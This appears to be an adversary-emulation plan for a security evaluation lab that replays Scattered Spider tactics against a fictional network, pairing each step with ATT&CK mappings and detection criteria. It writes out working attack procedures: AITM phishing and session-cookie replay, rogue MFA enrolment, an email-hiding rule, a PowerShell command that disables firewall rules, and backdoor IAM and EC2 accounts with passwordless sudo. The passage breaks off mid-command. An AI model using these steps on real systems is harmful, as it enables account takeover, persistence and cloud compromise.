# Scattered Spider Scenario

[1]:https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a

[2]:https://www.crowdstrike.com/blog/analysis-of-intrusion-campaign-targeting-telecom-and-bpo-companies/

[3]:https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf

[4]:https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries

[5]:https://cloud.google.com/blog/topics/threat-intelligence/unc3944-targets-saas-applications/

[6]:https://cloud.google.com/blog/topics/threat-intelligence/sim-swapping-abuse-azure-serial

[7]:https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/

[8]:https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/

[9]:https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud

[10]:https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/

[11]:https://www.cyberresilience.com/threatonomics/resilience-threat-researchers-identify-new-campaigns-from-scattered-spider/

[12]:https://www.trellix.com/blogs/research/scattered-spider-the-modus-operandi/

[13]:https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud

## Step 0 - Setup

### Voice Track

The following procedures setup the Scattered Spider scenario.

### Procedures

- ☣️ From Kali, in a new terminal window, start the AITM phishing server, entering
the password for sudo:

  | Password
  |  -
  | Barbed-Directive

  ```bash
  cd /opt/kalidev/scattered_spider/Resources/payloads
  sudo ./aitm -ip 174.3.0.70 -port 8888 -resourceDir ./static -authentikUrl https://sso.kingslanding.net/
  ```

  - ***Expected Output***

    ```text
    [INFO] 2024/10/30 15:23:32 Starting AITM server to listen on http://174.3.0.70:8888
    [INFO] 2024/10/30 15:23:32 AITM server will reach out to real Authentik server at https://sso.kingslanding.net/
    ```

- ☣️ From Kali, in this same terminal window, activate the Python virtual
environment. This should prepend your terminal prompt with `(venv)`. Use this
terminal for any Python commands run on Kali

  ```bash
  cd /opt/kalidev/
  source venv/bin/activate
  ```

- ☣️ From Kali, search for and open **Chrome**. If prompted for a keyring
password, click Cancel until the browser opens. then browse to the TacticalRMM
login page and log in:

  | Destination | Username | Password
  |  - | - | -
  | <https://rmm.kingslanding-hr.com/> | lstrong | Structure-Doorway

- ☣️ When prompted for an MFA token, open a new terminal window as `op1`, and run
the following command, entering the password when prompted. Enter the MFA code
into the Tactical RMM login page.

  | Password
  |  -
  | Decode-Acclimate

  ```bash
  totp-cli generate --follow tacticalrmm tactical-lstrong
  ```

  - ***Expected Output***

    ```text
    ######
    ```

- ☣️ In the Initial Setup window, for Client enter "tactical", for Site enter
"kingslanding", for timezone select "UTC", and for Company name enter
"kingslanding"

- ☣️ After logging in click `Agents`->`Install Agent`. In the new window select
`Manual` under Installation Method and Show Manual Installation Instructions.
Inside the codeblock copy the token following the `--auth` argument to an
external note for use later.

## Step 1 - Initial Access via Unmanaged Device

### Voice Track

Scattered Spider performs initial access via spearphishing emails with a link to a fake
SSO portal. After phishing the victim user's credentials and OTP token to obtain
a valid session cookie and CSRF token cookie, the adversary uses the cookies to
authenticate to the real SSO portal. With access to applications in the user's
SSO dashboard, the adversary learns of the victim user's access to the company
AWS account, Guacamole, and internal GitLab.

Upon accessing a remote machine
via Guacamole, Scattered Spider logs in to the victim's email and learns that the target
organization has an instance of AirByte installed.

Scattered Spider then uses the SSO
dashboard to add a secondary MFA method for the `tlannister` user that they used
for initial access.

### Procedures

- From the Windows jumpbox `jumpbox (12.78.110.37)`, RDP to the unmanaged
workstation `casterlyrock (12.78.44.201)`

  | Destination | Username | Password
  |  - | - | -
  | 12.78.44.201 | tlannister | Engine-Dropkick

- Minimize any spurious windows. Open FireFox then browse to Outlook. Use the
following credentials to login

  | Destination | Username | Password
  |  - | - | -
  | `https://sept.kingslanding.net/owa` | kingslanding\tlannister | Engine-Dropkick

- ☣️ Return to the Kali attack host `driftmark (174.3.0.70)` and switch to the
terminal with your Python virtual environment activated then execute the script
to send the spearphishing email to `tlannister`. This email will contain a link
to a fake login portal page.

  ```bash
  python3 /opt/kalidev/scattered_spider/Resources/email_generation/send_email.py mail.hulln.net /opt/kalidev/scattered_spider/Resources/email_generation/det_spearphishing.html -t tlannister@kingslanding.net -f it@kingslanding-it.net -fn 'Kingslanding IT Team' -s 'ACTION: SSO Updates Completed - Reauthentication Needed'
  ```

  - ***Expected Output***

    ```text
    Successfully sent email
    ```

- Return to the RDP to the unmanaged workstation `casterlyrock (12.78.44.201)`.
Open the email and click the link to the fake SSO portal, logging in to the
portal with the following credentials:

  | Username | Password
  |  - | -
  | tlannister | Engine-Dropkick

- When prompted for the MFA token, switch to the existing Kali RDP session, and
open a new terminal window as `op1` if one does not already exist. Execute the
TOTP CLI utility to generate a new token using the following command, entering
the following password when prompted. Copy the OTP and paste it into the fake
Authentik login portal, then click Continue

  | Password
  |  -
  | Decode-Acclimate

  ```bash
  totp-cli generate --follow kingslanding kingslanding-tlannister
  ```

  - ***Expected Output***

    ```text
    Password: ***
    ######
    ```

- ☣️ Return to the Kali attack host `driftmark (174.3.0.70)` and confirm receipt
of the authenticated session cookie and CSRF token cookie in the AITM phishing
server output

  - ***Expected Output***

    ```text
    [SUCCESS] 2025/07/14 22:30:32 Successful login for user tlannister
       [INFO] 2025/07/14 22:30:32 Obtained CSRF token for user tlannister: h8yWiJWEfi7bhhmrWPCWK69rMWUjjKck
       [INFO] 2025/07/14 22:30:32 Obtained final session cookie for user tlannister: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJqMW84bWVvMDIxeHd3cXNqdWk4dTRrNnNkdmcydWVibSIsImlzcyI6ImF1dGhlbnRpayIsInN1YiI6IjEwZjM4ODMzZDY5Y2UwODE1ZTg0YTdhMDNjZWMwMjUwMzRkMzUxMGVkMzUwNjRmZTIwYmVkZmUwOWUzZDBmNzQiLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJhY3IiOiJnb2F1dGhlbnRpay5pby9jb3JlL2RlZmF1bHQifQ.8hh2EcY6TtHeSornXNWXzJHEbjmU4ZIiEClmvkxvcpc
    [SUCCESS] 2025/07/14 22:30:32 Use the following cookie names and values to bypass login in a browser window:
            authentik_session: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJqMW84bWVvMDIxeHd3cXNqdWk4dTRrNnNkdmcydWVibSIsImlzcyI6ImF1dGhlbnRpayIsInN1YiI6IjEwZjM4ODMzZDY5Y2UwODE1ZTg0YTdhMDNjZWMwMjUwMzRkMzUxMGVkMzUwNjRmZTIwYmVkZmUwOWUzZDBmNzQiLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJhY3IiOiJnb2F1dGhlbnRpay5pby9jb3JlL2RlZmF1bHQifQ.8hh2EcY6TtHeSornXNWXzJHEbjmU4ZIiEClmvkxvcpc
            authentik_csrf: h8yWiJWEfi7bhhmrWPCWK69rMWUjjKck
    ```

- ☣️ From the Kali attack host `driftmark (174.3.0.70)`, open FireFox and use
Ctrl+Shift+P to open a Private Window then browse to the real SSO portal at
`https://sso.kingslanding.net/`. Open `More Tools` then `Web Developer Tools`
and go to the `Storage` tab and then to the `Cookies` drop-down menu. For the
SSO portal site, replace the `authentik_session` cookie value with the value
from the the AITM phishing server output. Click the + sign to create a new
cookie, set the name to `authentik_csrf`, and set the value to the
`authentik_csrf` value from the AITM phishing server output. Edit the URL in the
browser to replace it with `https://sso.kingslanding.net/` and then reload the
page. You should now be authenticated into the SSO portal as the user. Confirm
the presence of AWS, Gitlab, and Guacamole applications in the SSO dashboard.

- ☣️ In your SSO dashboard tab, right-click to open the settings page in a new
tab, then click on the MFA devices menu. Click "Enroll", then select "Static
Tokens". Record the displayed tokens in case your SSO session times out later, then click "Continue" on the
page. Confirm that the list of enabled MFA methods for the user now contains
static tokens.

- ☣️ Return to the SSO dashboard, right-click on the Guacamole application to Open
in New Tab and access the Guacamole dashboard with available remote machines.
Select `dragongate` from the list and authenticate to the remote desktop session
using the following credentials. For `Domain` enter `kingslanding`

  | Destination | Username | Password
  |  - | - | -
  | `kingslanding` | tlannister | Engine-Dropkick

- ☣️ Once the remote desktop has connected, open FireFox and type the Outlook URL
and the compromised credentials for `tlannister`. Confirm emails containing
information about AirByte and AWS.

  | Destination | Username | Password
  |  - | - | -
  | `https://sept.kingslanding.net/owa` | kingslanding\tlannister | Engine-Dropkick

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Reconnaissance | T1598.003 | Phishing for Information: Spearphishing Link | Windows | tlannister received an email from <it@kingslanding-it.net> and accessed mail.hulln.net via embedded email link | Calibrated - Not Benign | Scattered Spider sends an email with a link to a fake login page | casterlyrock (12.78.44.201), sept (10.55.3.101) | tlannister | [email_generation](https://github.com/attackevals/scattered_spider/tree/main/Resources/email_generation/) | [9], [11]
| Credential Access | T1557 | Adversary-in-the-Middle | Linux | Adversary transmits tlannister stolen cookies via session replay from 174.3.0.70 (mail.hulln[.]net) | Calibrated - Not Benign | Scattered Spider collects victim user credentials via the fake SSO portal | casterlyrock (12.78.44.201) | tlannister | [AITM](https://github.com/attackevals/scattered_spider/tree/main/Resources/AITM) | [8], [12]
| Initial Access | T1133 | External Remote Services | Linux | Adversary uses stolen cookies from session replay (via browser authentication) | Calibrated - Not Benign | Scattered Spider accesses legitimate victim SSO dashboard | citywatch (10.55.3.102) | tlannister | - | [1], [10], [12]
| Initial Access | T1078 | Valid Accounts | Linux, Identity Provider | Adversary successfully logs in to <https://sso.kingslanding.net/> with tlannister valid session token | Calibrated - Not Benign | Scattered Spider authenticates to victim SSO dashboard as `tlannister` | citywatch (10.55.3.102) | tlannister | - | [10], [12]
| Persistence | T1098.005 | Account Manipulation: Device Registration | Linux, Identity Provider | tlannister enrolls a static MFA token to <https://sso.kingslanding.net/> with an account previously accessed via stolen cookies | Calibrated - Not Benign | Scattered Spider adds a secondary MFA method to the `tlannister` account | citywatch (10.55.3.102) | tlannister | - | [1], [2]
| Lateral Movement | T1021.001 | Remote Services: Remote Desktop Protocol | Windows | tlannister successfully connects to 10.55.3.104 through RDP | Calibrated - Not Benign | Scattered Spider uses the Guacamole SSO dashboard application to connect to a remote desktop session on `dragongate (10.55.3.104)` | citywatch (10.55.3.102), kingswood (10.55.2.100), dragongate (10.55.3.104) | tlannister | - | [10], [12]
| Initial Access | T1078 | Valid Accounts | Windows | tlannister successfully logs into <https://sept.kingslanding.net/owa> | Calibrated - Not Benign | Scattered Spider logs in to the victim user's Outlook email | dragongate (10.55.3.104) | tlannister | - | [1], [10]

## Step 2 - Discovery

### Voice Track

After Scattered Spider has achieved initial access, Scattered Spider performs network discovery
and downloads AdExplorer to enumerate Active Directory for users and groups.
Scattered Spider also searches files and directories within a network share for
network-related documents to further understand configuration and management of
the network. In doing so, the adversary discovers information on how to connect
to the company's internal instance of AirByte, which is not yet integrated into
SSO.

### Procedures

- ☣️ Return to the remote desktop session to `dragongate (10.55.3.104)`, search
for Command Prompt and right-click to Run as Administrator

- ☣️ Open the Guacamole Clipboard using "CTRL + SHIFT + ALT", paste the following
discovery commands into the Clipboard textbox, then use "CTRL + SHIFT + ALT" to
hide the Guacamole Clipboard. Click into the Command Prompt, use "CTRL + V" and
then enter to execute the command.

  ```cmd
  whoami & ping google.com & wmic product get name, version & nltest /dclist:kingslanding.net & nltest /domain_trusts
  ```

  - ***Expected Output***

    ```text
    discovery output
    ```

- ☣️ Open the Guacamole Clipboard using "CTRL + SHIFT + ALT", paste the following
ping command into the Clipboard textbox, then use "CTRL + SHIFT + ALT" to hide
the Guacamole Clipboard. Click into the Command Prompt, use "CTRL + V" and then
enter to execute the command against the identified domain controller

  ```cmd
  ping redkeep.kingslanding.net
  ```

- ☣️ In the remote desktop session, open a new browser tab and type the following
URL to download AdExplorer:

  | Destination
  |  -
  | `https://download.sysinternals.com/files/AdExplorer.zip`

- ☣️ Using File Explorer, right-click the downloaded file > Extract Here to
extract the file to the Downloads folder.

- ☣️ Double-click to open AdExplorer.exe, then click `Run` and `Agree` to the End
User License Agreement if prompted. Authenticate with the following credentials
to the domain:

  | Destination | Username | Password
  |  - | - | -
  | `kingslanding.net` | tlannister | Engine-Dropkick

- ☣️ Once AdExplorer has connected to the domain, click the Search icon to open
the Search Container window. In the "Class" field, select "User -- user" from
the drop down, then click "Search".

- ☣️  In the results at the bottom of the Search Container, double-click
"CN=Users,DC=kingslanding,DC=net" then expand the "CN=Users" in the AdExplorer
window to view the domain users.

- ☣️ Return to the Search Container window. In the "Attribute" field, select "cn".
In the "Relation" field, select "contains". In the "Value" field, type "Admin"
then click "Add" and "Search".

- ☣️ In the results at the bottom of the Search Container, double-click "CN=Domain
Admins..." and, in the AdExplorer window, double-click the "member" attribute to
view the users listed in the Domain Admins group.

- ☣️ Return to the results at the bottom of the Search Container window.
Double-click "CN=System Admins..." and, in the AdExplorer window, double-click
the "member" attribute to view the users listed in the System Admins group.

- ☣️ Open File Explorer and, under "This PC", open the drive mapped to the file
server share. In the folder named "network_files", double-click each file to
open and view the contents. Open the file named `AirByteInfo.docx` to confirm
the document contains instructions on how to access the internal AirByte
instance.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | tlannister executed cmd.exe via shell | Calibrated - Not Benign | Scattered Spider uses Command Prompt to execute commands | dragongate (10.55.3.104) | tlannister | - | [6]
| Discovery | T1033 | System Owner/User Discovery | Windows | cmd.exe executed whoami.exe | Calibrated - Not Benign | Scattered Spider executes whoami | dragongate (10.55.3.104) | tlannister | - | [6], [5]
| Discovery | T1016.001 | System Network Configuration Discovery: Internet Connection Discovery | Windows | cmd.exe executed ping.exe with argument google.com | Calibrated - Not Benign | Scattered Spider pings google.com | dragongate (10.55.3.104) | tlannister | - | [3], [6]
| Discovery | T1518 | Software Discovery | Windows | cmd.exe executed wmic with product get name command to query installed software via WMI | Calibrated - Not Benign | Scattered Spider executes wmic to find installed software | dragongate (10.55.3.104) | tlannister | - | [3]
| Discovery | T1018 | Remote System Discovery | Windows | cmd.exe executed nltest /dclist to query kingslanding.net | Calibrated - Not Benign | Scattered Spider executes `nltest /dclist:kingslanding.net` | dragongate (10.55.3.104) | tlannister | - | [1], [3], [6]
| Discovery | T1482 | Domain Trust Discovery | Windows | cmd.exe executed nltest /domain_trusts to retrieve a list of trusted domains  | Calibrated - Not Benign | Scattered Spider executes `nltest /domain_trusts` | dragongate (10.55.3.104) | tlannister | - | [3]
| Discovery | T1018 | Remote System Discovery | Windows | cmd.exe executed ping.exe for redkeep.kingslanding.net | Calibrated - Not Benign | Scattered Spider pings `redkeep.kingslanding.net` | dragongate (10.55.3.104) | tlannister | - | [1], [3], [6]
| Command and Control | T1105 | Ingress Tool Transfer | Windows | firefox.exe downloads AdExplorer.zip via HTTP and extracts zip file from download location | Calibrated - Not Benign | Scattered Spider downloads AdExplorer | dragongate (10.55.3.104) | tlannister | - | [7], [10]
| Defense Evasion | T1078.002 | Valid Accounts: Domain Accounts | Windows | tlannister authenticates to the Active Directory kingslanding via AdExplorer.exe | Calibrated - Not Benign | Scattered Spider authenticates to the domain as `tlannister` | dragongate (10.55.3.104) | tlannister | - | [7], [10]
| Discovery | T1087.002 | Account Discovery: Domain Account | Windows | tlannister launched AdExplorer.exe using valid domain account credentials and enumerates Active Directory user accounts via LDAP queries | Calibrated - Not Benign | Scattered Spider uses AdExplorer to enumerate AD for user accounts | dragongate (10.55.3.104) | tlannister | - | [7], [10]
| Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | AdExplorer.exe enumerates the Domain Admin and System Admin AD groups and ACLs via LDAP browsing | Calibrated - Not Benign | Scattered Spider uses AdExplorer to enumerate AD for groups and permissions | dragongate (10.55.3.104) | tlannister | - | [7], [10]
| Discovery | T1083 | File and Directory Discovery | Windows | tlannister accessed several files in Z:\network_files | Calibrated - Not Benign | Scattered Spider searches through files | dragongate (10.55.3.104), citadel (10.55.3.103) | tlannister | - | [1]

## Step 3 - AWS Discovery and Defense Evasion

### Voice Track

Scattered Spider accesses the victim user's email account and sets a new inbox rule to
hide any future emails regarding Airbyte. Scattered Spider then performs social
engineering over phone calls to obtain an MFA token (whitecarded) to access the
victim company's AWS account and discovers enabled services, IAM users, roles
and permission groups, S3 buckets, and EC2 instances through the AWS Management
Console. Scattered Spider then runs commands on all hosts in an attempt to disable
firewall rules.

### Procedures

- ☣️ In the RDP session to `dragongate (10.55.3.104)`, return to your Outlook tab
at <https://sept.kingslanding.net/owa>. In the Outlook interface, select the cog
configuration icon at the top right and then select "Options". On the left-hand
menu, go to Mail -> Automatic Processing -> Inbox and Sweep Rules.

- ☣️ Click the plus icon to create a new inbox rule. Set the rule name to `spam`.
Under the conditions option, select "It includes these words" -> "In the body",
which will generate another pop-up window to specify words or phrases. In this
new window, add `airbyte`, and be sure to click the plus (`+`) sign or press
enter to actually add the word before hitting the OK button. You should now see
the word `airbyte` appear to the right of the conditions drop-down menu.

- ☣️ Under "Do all of the following", select "Move, copy, or delete" -> "Delete
the message".

- ☣️ At the bottom, make sure the "Stop processing more rules" options is toggled
on.

- ☣️ Click the "Ok" save button at the top of the popup window to save the rule.
Check that the new rule appears in the rules list. Click the "Save" button above
the list to save your changes.

- ☣️ Return to the browser tab with the SSO dashboard and click the Authentik icon
in the top-left to return to the SSO dashboard. Right-click the AWS icon to open
in a new tab. The AWS console will log you in automatically

- ☣️ In the AWS Console Home, ensure the region in the top-right says `us-east-1`.
If it does not, click the region and manually select `us-east-1` in the
dropdown.

- ☣️ In the AWS Console Home, in the top-right of the console, click the username
to open the dropdown then under "Account", right-click "Billing and Cost
Management" to open in a new tab. Then, in the left navigation pane under "Cost
Analysis", click "Cost Explorer". In the right-pane for "Report parameters",
click "Date Range" to open the date selection. Under "Auto-select range
(Relative)", next to "Past:" select "7 Days" then click Apply

- ☣️ Return to the tab with the AWS Console Home, search for "IAM", and
right-click to open the "IAM" console in a new tab. Then, in the left navigation
pane under "Access management", click "Users"

- ☣️ In the AWS IAM console, click "User groups" in the left navigation pane and
click through each group's "Users" to list the users in each group

- ☣️ Return to the tab with the AWS Console Home. Search for "S3" and right-click
to open "S3" in a new tab. Scroll to "General purpose buckets" to view the list
of available S3 buckets

- ☣️ Return to the tab with the AWS Console Home. Search for "VPC" and right-click
to open "VPC" in a new tab. On the left panel under "Virtual private cloud",
select "Your VPCs". Find the `REPLACE_WITH_VPC_NAME` VPC and check the adjacent
box to pull up its details. Ensure that there is an IPv4 CIDR block listed for
that VPC, and copy its **VPC ID** for later.

- ☣️ Next, on the left panel under "Virtual private cloud", select "Subnets". In
the subnet table search option, paste the VPC ID from before and confirm that
there is a subnet with the CIDR `10.212.3.0/24`.

- ☣️ Lastly, on the left panel under "Security", select "Security Groups". In the
security group table search option, paste the VPC ID from before and confirm
there is a security group with the name `REPLACE_WITH_SECURITY_GROUP_NAME` then check the
adjacent box to pull up its details.

- ☣️ Return to the tab with the AWS Console Home. Search for "Systems Manager",
and right-click to open "Systems Manager" in a new tab. Then, in the left
navigation pane under "Node Tools", click "Inventory" then scroll to
"Corresponding managed instances" to view the list of available targets

- ☣️ In the AWS Systems Manager console, in the left navigation pane under "Node
Tools", select "State Manager". Check the box to select the association with
"Document name" `AWS-GatherSoftwareInventory` and then click the "Apply
association now" button. If prompted for confirmation, click "Apply". Click the
refresh button periodically until the association status is no longer pending.

- ☣️ In the left navigation pane under "Node Tools", click "Run Command", click
the "Run command" button, select the `AWS-RunPowerShellScript` command document
and paste the following into the "Commands" box:

  ```psh
  $hosts = "fleabottom", "fishmonger", "dragongate", "sept", "citadel"; if ($hosts -contains $env:COMPUTERNAME) { Get-NetFirewallRule | Where-Object {$_.Action -eq 'Block'} | Set-NetFirewallRule -Enabled False; echo "Success"; }
  ```

- ☣️ Under "Target selection" select "Choose instances manually", then enter
"Platform type: Windows" in the search bar and check the box to select all
machines, under "Output options" uncheck "Enable an S3 bucket" then click "Run".
On the Command ID page, next to the "Cancel command" button, click the arrow to
refresh the status until the command has completed. Scroll down and check
the Success status for all targets.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Defense Evasion | T1564.008 | Hide Artifacts: Email Hiding Rules | Windows | tlannister created an Inbox rule with `delete` actions and keyword filters named `Airbyte` | Calibrated - Not Benign | Scattered Spider creates inbox rules to automatically delete future emails regarding Airbyte | sept (10.55.3.101) | tlannister | - | [8]
| Lateral Movement | T1021.007 | Remote Services: Cloud Services | IaaS | tlannister connects to AWS Console | Calibrated - Not Benign | Scattered Spider accesses the victim company's AWS account | - | tlannister | - | [2], [9]
| Defense Evasion | T1078.004 | Valid Accounts: Cloud Accounts | IaaS, Identity Provider | Adversary successfully authenticated to AWS Console using stolen tlannister credentials | Calibrated - Not Benign | Scattered Spider authenticates to the victim company's AWS account as `tlannister` | - | tlannister | - | [2], [9]
| Discovery | T1526 | Cloud Service Discovery | IaaS | tlannister enumerated Billing and Cost Management in AWS Console | Calibrated - Not Benign | Scattered Spider discovers enabled services through Billing and Cost Management of the AWS Management Console | - | tlannister | - | [9]
| Discovery | T1087.004 | Account Discovery: Cloud Account | IaaS | tlannister accessed IAM users in AWS Console | Calibrated - Not Benign | Scattered Spider uses AWS IAM console to list IAM users | - | tlannister | - | [13]
| Discovery | T1069.003 | Permission Groups Discovery: Cloud Groups | IaaS | tlannister accessed IAM users groups in AWS Console | Calibrated - Not Benign | Scattered Spider uses AWS IAM console to list IAM user groups and group members | - | tlannister | - | [13]
| Discovery | T1619 | Cloud Storage Object Discovery | IaaS | tlannister accessed S3 buckets in AWS Console | Calibrated - Not Benign | Scattered Spider uses AWS S3 console to list S3 buckets | - | tlannister | - | [9], [10]
| Discovery | T1580 | Cloud Infrastructure Discovery | IaaS | tlannister accessed VPCs, Security Groups, and Subnets in AWS Console | Calibrated - Not Benign | Scattered Spider uses AWS VPC console to view existing VPCs, security groups, and subnets for future EC2 instance creation | - | tlannister | - | [9]
| Discovery | T1538 | Cloud Service Dashboard | IaaS | tlannister queries AWS Systems Manager to enumerate instance information in AWS Console | Calibrated - Not Benign | Scattered Spider uses AWS Systems Manager to identify target hosts | - | tlannister | - | [1], [9]
| Execution | T1651 | Cloud Administration Command | IaaS | tlannister used AWS Systems Manager to execute a PowerShell script in AWS Console | Calibrated - Not Benign | Scattered Spider uses AWS Systems Manager to execute commands | - | tlannister | - | [1], [9]
| Discovery | T1518 | Software Discovery | Windows, Linux, IaaS | tlannister enumerated AWS account information via `AWS-GatherSoftwareInventory` on all available hosts in AWS Console | Calibrated - Not Benign | Scattered Spider uses AWS Systems Manager to execute `AWS-GatherSoftwareInventory` on all available hosts | redkeep (10.55.3.100), sept (10.55.3.101), citywatch (10.55.3.102), guildhall (10.212.3.106), dragonpit (10.212.3.105), rookery (10.212.3.107), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102) | nt authority\system | - | [9]
| Defense Evasion | T1562.004 | Impair Defenses: Disable or Modify System Firewall | Windows | powershell.exe was executed to disable firewall rules on hosts | Calibrated - Not Benign | Scattered Spider disables firewall rules on hosts | citadel (10.55.3.103), sept (10.55.3.101), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102) | nt authority\system | - | [7]

## Step 4 - AWS Persistence and Defense Evasion

### Voice Track

After performing initial discovery and defense evasion, Scattered Spider creates a new
IAM user. Using the newly created user accounts access keys Scattered Spider generates an
interactive session using aws_consoler. In the new interactive session Scattered Spider
creates an EC2 Linux instance using the AWS console. The new EC2 Linux instance
will act as the new staging point for payloads and as a pivot point and backdoor
for the adversary to maintain persistence.

### Procedures

- ☣️ Return to the browser tab with the AWS IAM console. In the left navigation
pane, under "Access Management", click "Users". On the right side, click the
"Create User" button. Type in the username `ahightower` and click "Next". Select
"Attach policies directly", search for "admin_policy" and check its box to
attach the policy, then click "Next". Finally, click "Create User".

- ☣️ In the AWS IAM console, click on the newly created user `ahightower`. Click
the "Create Access Key" button. Click "Command Line Interface(CLI)". Check the
box to confirm, and click "Next". In "Set description tag" window, leave the
"Description tag value" empty then click "Create access key". Click "Show" under
secret access key and copy both keys. Once copied, click Done

- ☣️ Return to Kali, switch to the terminal with your Python virtual environment
activated, and execute `aws_consoler` with the new users AWS key

  ```bash
  python3 /opt/kalidev/scattered_spider/Resources/payloads/aws_consoler/cli.py -a "<ahightower_access_key>" -s <ahightower_secret_access_key> -vv -R us-east-1
  ```

  - ***Expected Output***

    ```text
    2024-11-11 15:51:29,607 [__main__] INFO: Validating arguments...
    2024-11-11 15:51:29,607 [__main__] INFO: Calling logic.
    2024-11-11 15:51:29,607 [__main__] DEBUG: Establishing Boto3 session.
    2024-11-11 15:51:29,607 [__main__] DEBUG: Using CLI-provided credentials.
    2024-11-11 15:51:29,670 [__main__] INFO: Session using credential variables established.
    2024-11-11 15:51:30,193 [__main__] INFO: Session valid, attempting to federate as arn:aws:sts::484907520966:assumed-role/AWSReservedSSO_AdministratorAccess...
    2024-11-11 15:51:30,193 [__main__] DEBUG: Session credentials frozen.
    2024-11-11 15:51:30,193 [__main__] DEBUG: Creating console federation token.
    2024-11-11 15:51:30,288 [__main__] DEBUG: Federation token obtained, building URL.
    2024-11-11 15:51:30,288 [__main__] INFO: URL generated!
    https://signin.aws.amazon.com/federation?Action=login&Issuer=consoler.local&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&SigninToken=0Kr...
    ```

- ☣️ Paste the newly generated URL into a new Chrome tab on Kali `driftmark
(174.3.0.70)` and press enter.

- ☣️ In the AWS console created by aws_consoler, ensure the region is set to
`us-east-1`

- ☣️ In the AWS console created by aws_consoler, search for and open "CloudShell".
Run the following commands to create an IAM role and profile with administrator
access:

  ```bash
  aws iam create-role --role-name goldroad-role --assume-role-policy-document '{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": ["sts:AssumeRole"],"Principal": {"Service": ["ec2.amazonaws.com"]}}]}' --description "IAM role for goldroad";
  aws iam attach-role-policy --role-name goldroad-role --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess";
  aws iam create-instance-profile --instance-profile-name goldroad-role;
  aws iam add-role-to-instance-profile --instance-profile-name goldroad-role --role-name goldroad-role
  ```

  - ***Expected Output***

    ```text
    {
        "Role": {
            "Path": "/",
            "RoleName": "goldroad-role",
            "RoleId": "...",
            "Arn": "arn:aws:iam::...:role/goldroad-role",
            "CreateDate": "...",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Action": [
                            "sts:AssumeRole"
                        ],
                        "Principal": {
                            "Service": [
                                "ec2.amazonaws.com"
                            ]
                        }
                    }
                ]
            }
        }
    }

    {
        "InstanceProfile": {
            "Path": "/",
            "InstanceProfileName": "goldroad-role",
            "InstanceProfileId": "...",
            "Arn": "arn:aws:iam::...:instance-profile/goldroad-role",
            "CreateDate": "...",
            "Roles": []
        }
    }
    ```

- ☣️ In the same CloudShell terminal session, run the following command to create
an SSH key pair. Copy the private key output and save the contents to a text
file on Kali and into the Notes section of ARCADE.

  ```bash
  aws ec2 create-key-pair --key-name goldroad --key-type rsa --key-format pem --query "KeyMaterial" --output text
  ```

  - ***Expected Output***

    ```text
    -----BEGIN RSA PRIVATE KEY-----
    ...
    ...
    -----END RSA PRIVATE KEY-----
    ```

- ☣️ In the same CloudShell terminal session, run the following commands to create
a Linux EC2 instance and assign the previously created SSH key, IAM profile, and
role to the instance:

  ```bash
  user_data=$(printf '#cloud-config\n\nusers:\n  - default\n  - name: ahightower\n    passwd: "$6$l6VKsEbu25VlHZRq$pJ0MIeBozF4RqfpDkJmzaOB3QTSRNLJL81FNH4uV7.WpnVbVwd2bswmDnclA5TMUlL.MGnPVtUws7SUqp7Eqz0"\n    shell: /bin/bash\n    lock_passwd: false\n    ssh_pwauth: True\n    chpasswd:\n        expire: False\n    sudo: ALL=(ALL) NOPASSWD:ALL\n    groups: users\n' | base64 -w 10000);
  vpc_id=$(aws ec2 describe-vpcs --filters Name=tag:Name,Values=REPLACE_WITH_VPC_NAME | jq -r -c '[.Vpcs | .[]][0].VpcId');
  subnet_id=$(aws ec2 describe-subnets --filters Name=vpc-id,Values=$vpc_id Name=cidr-block,Values=10.212.3.0/24| jq -r -c '[.Subnets | .[]][0].SubnetId');
  group_id=$(aws ec2 describe-security-groups --filters Name=group-name,Values=REPLACE_WITH_SECURITY_GROUP_NAME* | jq -r -c '[.SecurityGroups | .[]][0].GroupId');
  image_id='ami-041a4695a2bdd9780';
  result=$(aws ec2 run-instances --image-id "$image_id" \
      --instance-type "t3.large" \
      --block-device-mappings '{"DeviceName":"/dev/sda1","Ebs":{"Encrypted":false,"DeleteOnTermination":true,"Iops":3000,"VolumeSize":20,"VolumeType":"gp3","Throughput":125}}' \
      --network-interfaces '{"SubnetId":"'$subnet_id'","DeleteOnTermination":true,"AssociatePublicIpAddress":false,"DeviceIndex":0,"PrivateIpAddresses":[{"Primary":true,"PrivateIpAddress":"10.212.3.108"}],"Groups":["'$group_id'"]}' \
      --credit-specification '{"CpuCredits":"unlimited"}' \
